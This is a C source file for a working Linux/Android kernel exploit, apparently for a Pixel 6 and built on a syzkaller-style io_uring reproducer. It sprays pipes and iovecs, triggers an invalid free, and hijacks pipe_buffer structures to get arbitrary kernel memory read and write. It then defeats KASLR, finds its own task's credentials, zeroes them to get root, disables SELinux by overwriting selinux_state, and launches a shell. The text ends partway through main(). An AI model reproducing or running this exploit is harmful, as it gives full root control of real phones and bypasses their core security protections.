#define _GNU_SOURCE
#undef NDEBUG
#define DEBUG

#include <assert.h>
#include <dirent.h>
#include <endian.h>
#include <err.h>
#include <errno.h>
#include <fcntl.h>
#include <linux/futex.h>
#include <linux/memfd.h>
#include <pthread.h>
#include <sched.h>
#include <setjmp.h>
#include <signal.h>
#include <stdarg.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/ipc.h>
#include <sys/mman.h>
#include <sys/msg.h>
#include <sys/prctl.h>
#include <sys/resource.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/time.h>
#include <sys/timerfd.h>
#include <sys/types.h>
#include <sys/uio.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

#include <sys/socket.h>

#define PATCHED

#define MAX_PIPE_NUM 0x400
#define MAX_256_PIPE 0x400
#define FIRST_PIPE_SPRAY 0x180
#define PIPE_PAGE_NUM 0x600
#define CPU 1

#define CHECK(a, b)                                                            \
  do {                                                                         \
    if (a != b)                                                                \
      err(1, "RUN CHECK FAILED in %d, expected %d, received %d", __LINE__,     \
          (int)b, (int)a);                                                     \
  } while (0)

int pipes[MAX_PIPE_NUM][2];
int pipe_pages[PIPE_PAGE_NUM][2];
void *global_data;
void *global_buffer;

// some symbols
unsigned long init_task;
unsigned long selinux_state;
unsigned long anon_pipe_buf_ops;

int child_pid;
int signal_pipes[2];
struct pipe_buffer_t {
  unsigned long page;
  unsigned int offset, len;
  unsigned long ops;
  unsigned long flag;
  unsigned long private;
};

void DumpHex(const void *data, size_t size) {
#ifdef DEBUG
  char ascii[17];
  size_t i, j;
  ascii[16] = '\0';
  for (i = 0; i < size; ++i) {
    if (i % 16 == 0) {
      printf("%04lx   ", i);
    }
    printf("%02X ", ((unsigned char *)data)[i]);
    if (((unsigned char *)data)[i] >= ' ' &&
        ((unsigned char *)data)[i] <= '~') {
      ascii[i % 16] = ((unsigned char *)data)[i];
    } else {
      ascii[i % 16] = '.';
    }
    if ((i + 1) % 8 == 0 || i + 1 == size) {
      printf(" ");
      if ((i + 1) % 16 == 0) {
        printf("|  %s \n", ascii);
      } else if (i + 1 == size) {
        ascii[(i + 1) % 16] = '\0';
        if ((i + 1) % 16 <= 8) {
          printf(" ");
        }
        for (j = (i + 1) % 16; j < 16; ++j) {
          printf("   ");
        }
        printf("|  %s \n", ascii);
      }
    }
  }
#endif
}

void pin_on_cpu(int cpu) {
  cpu_set_t cpu_set;
  CPU_ZERO(&cpu_set);
  CPU_SET(cpu, &cpu_set);
  if (sched_setaffinity(0, sizeof(cpu_set), &cpu_set) != 0) {
    perror("sched_setaffinity()");
    exit(EXIT_FAILURE);
  }
  usleep(1000);
}

static void adjust_rlimit() {
  // setsid(); // 814292
  struct rlimit rlim;
  rlim.rlim_cur = rlim.rlim_max = 0x10000;
  if (setrlimit(RLIMIT_NOFILE, &rlim) < 0) {
    rlim.rlim_cur = rlim.rlim_max = 14096;
    if (setrlimit(RLIMIT_NOFILE, &rlim) < 0) {
      perror("setrlimit");
      err(1, "setrlimit");
    }
  }
}

static __thread int skip_segv;
static __thread jmp_buf segv_env;

#define NONFAILING(...)                                                        \
  ({                                                                           \
    int ok = 1;                                                                \
    __atomic_fetch_add(&skip_segv, 1, __ATOMIC_SEQ_CST);                       \
    if (_setjmp(segv_env) == 0) {                                              \
      __VA_ARGS__;                                                             \
    } else                                                                     \
      ok = 0;                                                                  \
    __atomic_fetch_sub(&skip_segv, 1, __ATOMIC_SEQ_CST);                       \
    ok;                                                                        \
  })

static void sleep_ms(uint64_t ms) { usleep(ms * 1000); }

static uint64_t current_time_ms(void) {
  struct timespec ts;
  if (clock_gettime(CLOCK_MONOTONIC, &ts))
    exit(1);
  return (uint64_t)ts.tv_sec * 1000 + (uint64_t)ts.tv_nsec / 1000000;
}

static void thread_start(void *(*fn)(void *), void *arg) {
  pthread_t th;
  pthread_attr_t attr;
  pthread_attr_init(&attr);
  pthread_attr_setstacksize(&attr, 128 << 10);
  int i = 0;
  for (; i < 100; i++) {
    if (pthread_create(&th, &attr, fn, arg) == 0) {
      pthread_attr_destroy(&attr);
      return;
    }
    if (errno == EAGAIN) {
      usleep(50);
      continue;
    }
    break;
  }
  exit(1);
}

typedef struct {
  int state;
} event_t;

static void event_init(event_t *ev) { ev->state = 0; }

static void event_reset(event_t *ev) { ev->state = 0; }

static void event_set(event_t *ev) {
  if (ev->state)
    exit(1);
  __atomic_store_n(&ev->state, 1, __ATOMIC_RELEASE);
  syscall(SYS_futex, &ev->state, FUTEX_WAKE | FUTEX_PRIVATE_FLAG, 1000000);
}

static void event_wait(event_t *ev) {
  while (!__atomic_load_n(&ev->state, __ATOMIC_ACQUIRE))
    syscall(SYS_futex, &ev->state, FUTEX_WAIT | FUTEX_PRIVATE_FLAG, 0, 0);
}

static int event_isset(event_t *ev) {
  return __atomic_load_n(&ev->state, __ATOMIC_ACQUIRE);
}

static int event_timedwait(event_t *ev, uint64_t timeout) {
  uint64_t start = current_time_ms();
  uint64_t now = start;
  for (;;) {
    uint64_t remain = timeout - (now - start);
    struct timespec ts;
    ts.tv_sec = remain / 1000;
    ts.tv_nsec = (remain % 1000) * 1000 * 1000;
    syscall(SYS_futex, &ev->state, FUTEX_WAIT | FUTEX_PRIVATE_FLAG, 0, &ts);
    if (__atomic_load_n(&ev->state, __ATOMIC_ACQUIRE))
      return 1;
    now = current_time_ms();
    if (now - start > timeout)
      return 0;
  }
}

static bool write_file(const char *file, const char *what, ...) {
  char buf[1024];
  va_list args;
  va_start(args, what);
  vsnprintf(buf, sizeof(buf), what, args);
  va_end(args);
  buf[sizeof(buf) - 1] = 0;
  int len = strlen(buf);
  int fd = open(file, O_WRONLY | O_CLOEXEC);
  if (fd == -1)
    return false;
  if (write(fd, buf, len) != len) {
    int err = errno;
    close(fd);
    errno = err;
    return false;
  }
  close(fd);
  return true;
}

#define SIZEOF_IO_URING_SQE 64
#define SIZEOF_IO_URING_CQE 16
#define SQ_HEAD_OFFSET 0
#define SQ_TAIL_OFFSET 64
#define SQ_RING_MASK_OFFSET 256
#define SQ_RING_ENTRIES_OFFSET 264
#define SQ_FLAGS_OFFSET 276
#define SQ_DROPPED_OFFSET 272
#define CQ_HEAD_OFFSET 128
#define CQ_TAIL_OFFSET 192
#define CQ_RING_MASK_OFFSET 260
#define CQ_RING_ENTRIES_OFFSET 268
#define CQ_RING_OVERFLOW_OFFSET 284
#define CQ_FLAGS_OFFSET 280
#define CQ_CQES_OFFSET 320

struct io_sqring_offsets {
  uint32_t head;
  uint32_t tail;
  uint32_t ring_mask;
  uint32_t ring_entries;
  uint32_t flags;
  uint32_t dropped;
  uint32_t array;
  uint32_t resv1;
  uint64_t resv2;
};

struct io_cqring_offsets {
  uint32_t head;
  uint32_t tail;
  uint32_t ring_mask;
  uint32_t ring_entries;
  uint32_t overflow;
  uint32_t cqes;
  uint64_t resv[2];
};

struct io_uring_params {
  uint32_t sq_entries;
  uint32_t cq_entries;
  uint32_t flags;
  uint32_t sq_thread_cpu;
  uint32_t sq_thread_idle;
  uint32_t features;
  uint32_t resv[4];
  struct io_sqring_offsets sq_off;
  struct io_cqring_offsets cq_off;
};

#define IORING_OFF_SQ_RING 0
#define IORING_OFF_SQES 0x10000000ULL

#define sys_io_uring_setup 425
static long syz_io_uring_setup(volatile long a0, volatile long a1,
                               volatile long a2, volatile long a3,
                               volatile long a4, volatile long a5) {
  uint32_t entries = (uint32_t)a0;
  struct io_uring_params *setup_params = (struct io_uring_params *)a1;
  void *vma1 = (void *)a2;
  void *vma2 = (void *)a3;
  void **ring_ptr_out = (void **)a4;
  void **sqes_ptr_out = (void **)a5;
  uint32_t fd_io_uring = syscall(sys_io_uring_setup, entries, setup_params);
  uint32_t sq_ring_sz =
      setup_params->sq_off.array + setup_params->sq_entries * sizeof(uint32_t);
  uint32_t cq_ring_sz = setup_params->cq_off.cqes +
                        setup_params->cq_entries * SIZEOF_IO_URING_CQE;
  uint32_t ring_sz = sq_ring_sz > cq_ring_sz ? sq_ring_sz : cq_ring_sz;
  *ring_ptr_out = mmap(vma1, ring_sz, PROT_READ | PROT_WRITE,
                       MAP_SHARED | MAP_POPULATE | MAP_FIXED, fd_io_uring,
                       IORING_OFF_SQ_RING);
  uint32_t sqes_sz = setup_params->sq_entries * SIZEOF_IO_URING_SQE;
  *sqes_ptr_out =
      mmap(vma2, sqes_sz, PROT_READ | PROT_WRITE,
           MAP_SHARED | MAP_POPULATE | MAP_FIXED, fd_io_uring, IORING_OFF_SQES);
  return fd_io_uring;
}

static long syz_io_uring_submit(volatile long a0, volatile long a1,
                                volatile long a2, volatile long a3) {
  char *ring_ptr = (char *)a0;
  char *sqes_ptr = (char *)a1;
  char *sqe = (char *)a2;
  uint32_t sqes_index = (uint32_t)a3;
  uint32_t sq_ring_entries = *(uint32_t *)(ring_ptr + SQ_RING_ENTRIES_OFFSET);
  uint32_t cq_ring_entries = *(uint32_t *)(ring_ptr + CQ_RING_ENTRIES_OFFSET);
  uint32_t sq_array_off =
      (CQ_CQES_OFFSET + cq_ring_entries * SIZEOF_IO_URING_CQE + 63) & ~63;
  if (sq_ring_entries)
    sqes_index %= sq_ring_entries;
  char *sqe_dest = sqes_ptr + sqes_index * SIZEOF_IO_URING_SQE;
  memcpy(sqe_dest, sqe, SIZEOF_IO_URING_SQE);
  uint32_t sq_ring_mask = *(uint32_t *)(ring_ptr + SQ_RING_MASK_OFFSET);
  uint32_t *sq_tail_ptr = (uint32_t *)(ring_ptr + SQ_TAIL_OFFSET);
  uint32_t sq_tail = *sq_tail_ptr & sq_ring_mask;
  uint32_t sq_tail_next = *sq_tail_ptr + 1;
  uint32_t *sq_array = (uint32_t *)(ring_ptr + sq_array_off);
  *(sq_array + sq_tail) = sqes_index;
  __atomic_store_n(sq_tail_ptr, sq_tail_next, __ATOMIC_RELEASE);
  return 0;
}

static void kill_and_wait(int pid, int *status) {
  kill(-pid, SIGKILL);
  kill(pid, SIGKILL);
  for (int i = 0; i < 100; i++) {
    if (waitpid(-1, status, WNOHANG | __WALL) == pid)
      return;
    usleep(1000);
  }
  DIR *dir = opendir("/sys/fs/fuse/connections");
  if (dir) {
    for (;;) {
      struct dirent *ent = readdir(dir);
      if (!ent)
        break;
      if (strcmp(ent->d_name, ".") == 0 || strcmp(ent->d_name, "..") == 0)
        continue;
      char abort[300];
      snprintf(abort, sizeof(abort), "/sys/fs/fuse/connections/%s/abort",
               ent->d_name);
      int fd = open(abort, O_WRONLY);
      if (fd == -1) {
        continue;
      }
      if (write(fd, abort, 1) < 0) {
      }
      close(fd);
    }
    closedir(dir);
  } else {
  }
  while (waitpid(-1, status, __WALL) != pid) {
  }
}

static void setup_test() {
  prctl(PR_SET_PDEATHSIG, SIGKILL, 0, 0, 0);
  setpgrp();
  write_file("/proc/self/oom_score_adj", "1000");
}

struct thread_t {
  int created, call;
  event_t ready, done;
};

static struct thread_t threads[16];
static void execute_call(int call);
static int running;

static int thr2_start = 0;
static int thr1_enter = 0;
static int thr2_execve = 0;

static void *thr_1(void *arg) {
  pin_on_cpu(CPU);
  struct thread_t *th = (struct thread_t *)arg;
  for (;;) {
    event_wait(&th->ready);
    event_reset(&th->ready);
    // execute_call(th->call);
    for (int i = 0; i < 11; i++) {
      if (i == 5)
        continue;
      execute_call(i);
    }
    thr2_start = 1;
    while (thr1_enter != 1) {
    }
    execute_call(9);
    thr2_execve = 1;
    __atomic_fetch_sub(&running, 1, __ATOMIC_RELAXED);
    event_set(&th->done);
  }
  return 0;
}

static void *thr_2(void *arg) {
  pin_on_cpu(CPU);
  // new cred
  // setgid(getgid());
  struct thread_t *th = (struct thread_t *)arg;
  for (;;) {
    event_wait(&th->ready);
    event_reset(&th->ready);
    // execute_call(th->call);
    while (thr2_start != 1) {
    }
    for (int i = 0; i < 10; i++) {
      if (i == 9)
        continue;
      execute_call(i);
    }
    thr1_enter = 1;
    while (thr2_execve != 1) {
    }
    execute_call(11);
    execute_call(12);
    __atomic_fetch_sub(&running, 1, __ATOMIC_RELAXED);
    event_set(&th->done);
  }
  return 0;
}

static void execute_one(void) {
  int i, call, thread;
  int collide = 0;

  {
    struct thread_t *th = &threads[0];
    if (!th->created) {
      th->created = 1;
      event_init(&th->ready);
      event_init(&th->done);
      event_set(&th->done);
      thread_start(thr_1, th);
    }
    event_reset(&th->done);
    // th->call = call;
    __atomic_fetch_add(&running, 1, __ATOMIC_RELAXED);
    event_set(&th->ready);
    event_timedwait(&th->done, 50);
  }

#ifdef PATCHED
  setuid(getuid());
#endif

  {
    struct thread_t *th = &threads[1];
    if (!th->created) {
      th->created = 1;
      event_init(&th->ready);
      event_init(&th->done);
      event_set(&th->done);
      thread_start(thr_2, th);
    }
    event_reset(&th->done);
    // th->call = call;
    __atomic_fetch_add(&running, 1, __ATOMIC_RELAXED);
    event_set(&th->ready);
    event_timedwait(&th->done, 50);
  }
  for (i = 0; i < 1000 && __atomic_load_n(&running, __ATOMIC_RELAXED); i++)
    usleep(1000);
}

static void execute_one(void);

void do_trigger() {
  pin_on_cpu(CPU);
  // setup_test();
  execute_one();
}

#define WAIT_FLAGS __WALL

#define OLD_LOOP
#ifdef OLD_LOOP

static void loop(void) {
  int iter = 0;
  for (; iter < 1; iter++) {
    int pid = fork();
    if (pid < 0)
      exit(1);
    if (pid == 0) {
#ifdef PATCHED
      setuid(getuid());
#endif
      printf("in trigger process\n");
      do_trigger();
      printf("exit...\n");
      exit(0);
    }
    int status = 0;
    uint64_t start = current_time_ms();

    for (;;) {
      if (waitpid(-1, &status, WNOHANG | WAIT_FLAGS) == pid)
        break;
      sleep_ms(1);
      if (current_time_ms() - start < 5000)
        continue;
      kill_and_wait(pid, &status);
      break;
    }
  }
}
#else
static void loop(void) {
  setup_test();
  execute_one();
}
#endif

#ifndef __NR_io_uring_enter
#define __NR_io_uring_enter 426
#endif

uint64_t r[6] = {0xffffffffffffffff, 0xffffffffffffffff, 0x0, 0x0,
                 0xffffffffffffffff, 0xffffffffffffffff};

int timerfd[0x80] = {};

void execute_call(int call) {
  intptr_t res = 0;
  switch (call) {
  case 2:
    NONFAILING(*(uint32_t *)0x20000084 = 0);
    NONFAILING(*(uint32_t *)0x20000088 = 1);
    NONFAILING(*(uint32_t *)0x2000008c = 0);
    NONFAILING(*(uint32_t *)0x20000090 = 0);
    NONFAILING(*(uint32_t *)0x20000098 = -1);
    NONFAILING(memset((void *)0x2000009c, 0, 12));
    res = -1;
    NONFAILING(res = syz_io_uring_setup(0x10, 0x20000080,
                                        0x20ee7000, // from 0x12d6 to 0x10
                                        0x206d4000, 0x20000180, 0x200001c0));
    if (res != -1) {
      r[1] = res;
      NONFAILING(r[2] = *(uint64_t *)0x20000180);
      NONFAILING(r[3] = *(uint64_t *)0x200001c0);
    }
    break;
  case 3:
    res = open("/apex/com.android.runtime/lib64/bionic/libc.so",
               O_DIRECT | O_NONBLOCK, 0);
    // printf("we got %ld when syscall opening libc\n", res);
    assert(res != -1);
    if (res != -1)
      r[4] = res;
    break;
  case 4:
    NONFAILING(*(uint8_t *)0x20000000 = 1);
    NONFAILING(*(uint8_t *)0x20000001 = 0);
    NONFAILING(*(uint16_t *)0x20000002 = 0);
    NONFAILING(*(uint32_t *)0x20000004 = r[4]);
    NONFAILING(*(uint64_t *)0x20000008 = 0);
    NONFAILING(*(uint64_t *)0x20000010 = 0x20000500);
    NONFAILING(*(uint64_t *)0x20000500 = 0);
    NONFAILING(*(uint64_t *)0x20000508 = 0);
    NONFAILING(*(uint32_t *)0x20000018 = 1);
    NONFAILING(*(uint32_t *)0x2000001c = 0);
    NONFAILING(*(uint64_t *)0x20000020 = 0);
    NONFAILING(*(uint16_t *)0x20000028 = 0);
    NONFAILING(*(uint16_t *)0x2000002a = 0);
    NONFAILING(memset((void *)0x2000002c, 0, 20));
    NONFAILING(syz_io_uring_submit(r[2], r[3], 0x20000000, 0));
    break;
  case 5:
    // unused io
    NONFAILING(*(uint32_t *)0x200002c4 = 0x2b24);
    NONFAILING(*(uint32_t *)0x200002c8 = 1); // privilege decision
    NONFAILING(*(uint32_t *)0x200002cc = 1);
    NONFAILING(*(uint32_t *)0x200002d0 = 0x1f0);
    NONFAILING(*(uint32_t *)0x200002d8 = r[4]);
    NONFAILING(memset((void *)0x200002dc, 0, 12));
    break;
  case 6:
    NONFAILING(memcpy((void *)0x20000000, "/proc/self/exe\000", 15));
    res = syscall(__NR_openat, 0xffffff9c, 0x20000000ul, 0ul, 0ul);
    // printf("got res %ld when opening exe\n", res);
    assert(res != -1);
    if (res != -1)
      r[5] = res;
    break;
  case 7:
    // syscall(__NR_open, 0ul, 0x188002ul, 0x10ul);
    break;
  case 8:
    syscall(__NR_mmap, 0x20000000ul, 0x800000ul, 0x1800003ul, 0x12ul, r[5],
            0ul);
    break;
  case 9:
    syscall(__NR_io_uring_enter, r[1], 0x2b66, 0, 0ul, 0ul, 0x5eul);
    break;
  case 10:
    // NONFAILING(memcpy((void*)0x20000040, "./bus\000", 6));
    // syscall(__NR_execve, 0x20000040ul, 0ul, 0ul);
    break;
  case 11: // to trigger init req sync
#define IORING_ENTER_GETEVENTS (1U << 0)
           // flag = IORING_ENTER_GETEVENTS
    // tell parent to do the second allocation
    // printf("allocating 256 in parent\n");
    kill(getppid(), SIGUSR2);
    read(signal_pipes[0], global_buffer + 0x1300, 1);

    // printf("enter io uring\n");
    syscall(__NR_io_uring_enter, r[1], 0, 1, IORING_ENTER_GETEVENTS, 0ul,
            0x5eul);

    // tell parents to spray pipe_buffer
    // this will crash kernel
    kill(getppid(), SIGUSR2);
    read(signal_pipes[0], global_buffer + 0x1300, 1);
    break;
  }
}

void trigger() {
  loop();
  printf("trigger done\n");
}

void *do_iov_spray(void *idx) {
  pin_on_cpu(CPU);

  unsigned long pipe_idx = (unsigned long)(idx);
  char data[0x100] = {};
  struct iovec iovec_array[256 / 16];
  assert(sizeof(iovec_array) == 256);
  int *sync_pipes = (int *)global_data + 0x100;

  for (int i = 0; i < 256 / 16; i++) {
    iovec_array[i].iov_len = 1;
    iovec_array[i].iov_base =
        (void *)((char *)global_buffer + pipe_idx * 16 + i);
  }

  if (pipe_idx >= MAX_256_PIPE) {
    goto spray_256;
  }

  read(pipes[pipe_idx][0], data, 1);
  CHECK(*data, 'S');
  write(sync_pipes[1], "E", 1);
  // printf("pipe %ld spaied\n", pipe_idx);
  // if (pipe_idx == 0) printf("allocating 256 for 0\n");
  // printf("pipe idx %ld allocated\n", pipe_idx);
  int res = readv(pipes[pipe_idx][0], iovec_array, 256 / 16);
  if (res != 256 / 16) {
    printf("pipe %ld res is %d\n", pipe_idx, res);
    // iov might be corrupted, do that again without iov
    res = read(pipes[pipe_idx][0], (char *)global_buffer + pipe_idx * 16,
               256 / 16);
    printf("second read, res is %d\n", res);
  }
  write(sync_pipes[1], "E", 1);

spray_256:
  // wait for signal
  // *data = 0;
  // read(pipes[pipe_idx][0], data, 1);
  // assert(*data == 'S');
  // write(sync_pipes[1], "S", 1);

  // // after having the signal, do the spray
  // readv(pipes[pipe_idx][0], iovec_array, 256/16);
  // // keep sleeping to prevent too many freed pages

  // write(sync_pipes[1], "S", 1);
  while (1) {
    sleep(10000);
  }
}

// arm implementation
unsigned long page_address(unsigned long page) {
  unsigned long addr = ((page << 6) + 0xffffc008000000ul) | 0xffff000000000000;
  // printf("page %lx to addr %lx\n", page, addr);
  return addr;
}

unsigned long addr_to_page(unsigned long addr) {
  addr = addr & 0xfffffffffffff000ul;
  unsigned long page = ((addr - 0xffffc008000000ul) >> 6);
  // printf("addr %lx to page %lx\n", addr, page);
  return page;
}

unsigned long read64(unsigned long addr) {
  if ((addr & 0xfff) + 8 > 0x1000) {
    return 0;
  }
  int *exp_pipes = (int *)global_data;
  int pipe_buffer_offset = exp_pipes[4];

  // put the page to tmp_page;
  read(exp_pipes[2], global_buffer, 0x1000);

  memset(global_buffer, 'D', 0x1000);
  unsigned long *buf = (unsigned long *)global_buffer;
  struct pipe_buffer_t *p_buffer =
      (struct pipe_buffer_t *)(&buf[pipe_buffer_offset]);

  memcpy(p_buffer, global_data + 0x80, 40);

  p_buffer->page = addr_to_page(addr);
  p_buffer->len = 9;
  p_buffer->offset = addr & 0xfff;
  for (int i = 1; i < 4; i++) {
    memcpy(p_buffer + i, p_buffer, 40);
  }

  // overwrite pipe_buffer
  write(exp_pipes[3], global_buffer, 0x1000);

  // now do the read memory
  unsigned long data;
  read(exp_pipes[0], &data, 8);
  return data;
}

void write64(unsigned long addr, unsigned long data) {
  assert((addr & 0xfff) + 8 <= 0x1000);
  int *exp_pipes = (int *)global_data;
  int pipe_buffer_offset = exp_pipes[4];

  // put the page to tmp_page;
  read(exp_pipes[2], global_buffer, 0x1000);

  memset(global_buffer, 'D', 0x1000);
  unsigned long *buf = (unsigned long *)global_buffer;
  struct pipe_buffer_t *p_buffer =
      (struct pipe_buffer_t *)(&buf[pipe_buffer_offset]);

  memcpy(p_buffer, global_data + 0x80, 40);

  p_buffer->page = addr_to_page(addr);
  p_buffer->len = 0;
  p_buffer->offset = addr & 0xfff;
  for (int i = 1; i < 4; i++) {
    memcpy(p_buffer + i, p_buffer, 40);
  }

  // overwrite pipe_buffer
  write(exp_pipes[3], global_buffer, 0x1000);

  // now do the write of memory
  write(exp_pipes[1], &data, 8);
}

void read_mem(unsigned long addr, unsigned long *data, unsigned size) {
  for (int i=0; i<size/8; i++) {
    data[i] = read64(addr+i*8);
  }
}

void write_mem(unsigned long addr, unsigned long *data, unsigned size) {
  for (int i=0; i<size/8; i++) {
    write64(addr+i*8, data[i]);
  }
}

void exploit(void) {
  int *exp_pipes = (int *)global_data;
  char data[0x100] = {};
  int *sync_pipes = (int *)global_data + 0x100;
  int size = 0;

#ifdef CRASH
  sleep(1);

  trigger();
  printf("exit...\n");
  exit(0);
#endif

  for (int i = 0; i < MAX_PIPE_NUM; i++) {
    if (pipe(pipes[i]) < 0) {
      err(1, "pipe");
    }
    // prefault the page
    CHECK(fcntl(pipes[i][1], F_SETPIPE_SZ, 0x1000), 0x1000);
    write(pipes[i][1], global_buffer, 1);
    CHECK(read(pipes[i][0], global_buffer, 1), 1);
  }

  // prepare sync pipe
  if (pipe(sync_pipes) < 0) {
    err(1, "sync pipe");
  }
  CHECK(fcntl(sync_pipes[1], F_SETPIPE_SZ, 0x1000), 0x1000);
  write(sync_pipes[1], global_buffer, 1);
  read(sync_pipes[0], global_buffer, 1);

  // prepare exp pipe
  if (pipe(exp_pipes) < 0) {
    err(1, "sync pipe");
  }
  write(exp_pipes[1], global_buffer, 1);
  read(exp_pipes[0], global_buffer, 1);
  write(exp_pipes[1], global_buffer, 1);

  // a good time to setup context for the second stage
  for (int i = 0; i < PIPE_PAGE_NUM; i++) {
    if (pipe(pipe_pages[i]) < 0) {
      perror("pipe");
      exit(0);
    }
    CHECK(fcntl(pipe_pages[i][1], F_SETPIPE_SZ, 0x1000), 0x1000);
  }

  for (unsigned long i = 0; i < MAX_PIPE_NUM; i++) {
    pthread_t pid;
    pthread_create(&pid, NULL, do_iov_spray, (void *)i);
  }
  printf("preparing...\n");
  sleep(1);

  printf("[*] STAGE 1: defragmentation\n");
  // spray the first part
  for (int i = 0; i < FIRST_PIPE_SPRAY; i++) {
    usleep(10);
    write(pipes[i][1], "S", 1);
  }

  // sync with the spray
  int count = FIRST_PIPE_SPRAY;
  while (count) {
    usleep(10);
    int res = read(sync_pipes[0], global_buffer, count);
    count -= res;
  }
  // printf("first part spray done\n");

  printf("[*] STAGE 2: trigger the bug\n");
  kill(child_pid, SIGUSR1);

  // now spray the second part
  read(signal_pipes[0], data, 1);
  assert(data[0] == 'S');

  // allocate a pipe buffer for this
  CHECK(fcntl(exp_pipes[1], F_SETPIPE_SZ, 0x4000), 0x4000);
  // fill the slab with other iovs
  for (int i = FIRST_PIPE_SPRAY; i < MAX_256_PIPE; i++) {
    // usleep(10);
    write(pipes[i][1], "S", 1);
  }

  // sync with the spray
  count = MAX_256_PIPE - FIRST_PIPE_SPRAY;
  while (count) {
    usleep(10);
    int res = read(sync_pipes[0], global_buffer + 0x300, count);
    // printf("read res : %d\n", res);
    count -= res;
  }

  // let the bug triggered
  kill(child_pid, SIGUSR1);
  // wait from the child, now the invalid free happened, before the exit of task
  read(signal_pipes[0], data, 1);
  assert(data[0] == 'S');
  // no action here.

  // now let child exit
  kill(child_pid, SIGUSR1);
  // wait the child to exit
  read(signal_pipes[0], data, 1);
  assert(data[0] == 'S');
  // sleep for a while making sure the memory is freed
  usleep(1000 * 1000);

  printf("[*] STAGE 3: free the cache\n");
  // now free the iov
  for (int i = MAX_256_PIPE - 1; i >= 0; i--) {
    usleep(10);
    write(pipes[i][1], global_buffer + 0x200, 256 / 16);
  }

  // sync with the free
  count = MAX_256_PIPE;
  while (count) {
    usleep(10);
    int res = read(sync_pipes[0], global_buffer + 0x300, count);
    // printf("read res : %d\n", res);
    count -= res;
  }

#if 0
  printf("let's crash the kernel\n");
  // getchar();

  ioctl(exp_pipes[1], FIONREAD, &size);
  printf("FIONREAD pipe 1 is %d\n", size);
  sleep(1);
  fcntl(exp_pipes[1], F_SETPIPE_SZ, 0x8000);
  getchar();

#endif

  printf("[*] STAGE 4: reclaim the page\n");
  memset(global_buffer, 'A', 0x1000);
  for (int i = 0; i < PIPE_PAGE_NUM; i++) {
    write(pipe_pages[i][1], global_buffer, 0x1000);
  }

  // now check pipe_buffer
  ioctl(exp_pipes[1], FIONREAD, &size);
  printf("FIONREAD pipe 1 is %x\n", size);
  if (size != 0x41414141) {
    printf("failed, please retry\n");
    getchar();
  }

  // rewrite pipe buffer
  write(exp_pipes[1], "KCTF", 0x4);

  // now check the pipe pages
  unsigned long *recv_buffer =
      (unsigned long *)((char *)global_buffer + 0x1000);
  unsigned long *pipe_buffer = 0;
  int res = 0, exp_pipe_idx = -1;
  for (int i = 0; i < PIPE_PAGE_NUM; i++) {
    res = read(pipe_pages[i][0], recv_buffer, 0x1000);
    if (res != 0x1000) {
      err(1, "pipe %d read error\n", i);
    }

    for (int j = 0; j < (0x1000 / 8); j++) {
      if (recv_buffer[j] != 0x4141414141414141) {
        pipe_buffer = recv_buffer + j;
        DumpHex(pipe_buffer, 0x30);
        memcpy(global_data + 0x80, pipe_buffer, 40);
        exp_pipe_idx = i;
        exp_pipes[2] = pipe_pages[i][0];
        exp_pipes[3] = pipe_pages[i][1];
        exp_pipes[4] = j - 5; // pipe_buffer should move forward
        break;
      }
    }
    if (pipe_buffer != 0)
      break;
  }

  if (exp_pipe_idx == -1) {
    printf("failed, please retry\n");
    getchar();
  }

  write_file("/proc/self/comm", "expp");
  // pixel 6
  // ffffffdc0bfcbec0 init_task
  // ffffffdc0b93d968 anon_pipe_buf_ops

  // general offset ranges 0x684398 - 0x68d458

  write(exp_pipes[3], recv_buffer, 0x1000);
  printf("leaked pipe page at %lx\n", pipe_buffer[0]);
  printf("leaked ops at %lx\n", pipe_buffer[2]);
  unsigned long kaslr_offset = pipe_buffer[2] - anon_pipe_buf_ops;

  init_task += kaslr_offset;
  printf("kaslr offset is %lx\n", kaslr_offset);
  printf("init task at %lx\n", init_task);
  printf("looking for my process...\n");

  unsigned long current_task = init_task;
  while (true) {
    current_task = read64(current_task + 0x4c8);
    current_task = current_task - 0x4c8;

    unsigned long name[2];
    name[0] = read64(current_task + 0x790);
    if (!strcmp((char *)name, "expp")) {
      printf("we found the process at %lx\n", current_task);
      break;
    }
  }

  unsigned long cred = read64(current_task + 0x780);
  printf("found cred at %lx\n", cred);
  printf("getting root...\n");
  write64(cred + 0x4, 0);
  write64(cred + 0x4 + 8, 0);
  write64(cred + 0x4 + 2 * 8, 0);
  setuid(0);
  seteuid(0);

  printf("now we uid/gid: %d/%d\n", getuid(), getgid());
  printf("disabling selinux...\n");
  selinux_state += kaslr_offset;
  // enforing is 1 byte, writing 8 bytes overwrites others
  write64(selinux_state - 7, 0);
  system("/system/bin/sh");

  while (1) {
    sleep(1000);
  }
}

void signal_handler(int sig) {
  switch (sig) {
  case SIGUSR1:
    // printf("signal from parent\n");
    write(signal_pipes[1], "S", 1);
    break;
  case SIGUSR2:
    // printf("signal from child\n");
    write(signal_pipes[1], "S", 1);
    break;
  default:
    break;
  }
}

void get_symbols(char *path) {
  FILE *fp = fopen(path, "r");
  assert(fp != NULL);
  char line[0x100];
  while (fgets(line, sizeof(line), fp)) {
    char addr[0x20] = "0x";
    strncpy(addr+2, line, 0x10);
    if (!strcmp(&line[19], "selinux_state\n")) {
      selinux_state = strtoul(addr, NULL, 16);
      printf("got 0x%lx for %s", selinux_state, &line[19]);
    }

    if (!strcmp(&line[19], "init_task\n")) {
      init_task = strtoul(addr, NULL, 16);
      printf("got 0x%lx for %s", init_task, &line[19]);
    }

    if (!strcmp(&line[19], "anon_pipe_buf_ops\n")) {
      anon_pipe_buf_ops = strtoul(addr, NULL, 16);
      printf("got 0x%lx for %s", anon_pipe_buf_ops, &line[19]);
    }
    memset(line, 0, sizeof(line));
  }
}

int main(int argc, char **argv) {
  if (argc == 1) {
    printf("usage: %s [symbol file]\n", argv[0]);
    exit(0);
  }
  get_symbols(argv[1]);

  pin_on_cpu(CPU);
  adjust_rlimit();
  syscall(__NR_mmap, 0x20000000ul, 0x1000ul, 7ul, 0x32ul, -1, 0ul);
  global_data = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
                     MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);
  global_buffer = mmap(NULL, 0x4000, PROT_READ | PROT_WRITE,
                       MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);
  memset(global_buffer, 'A', 0x2000);
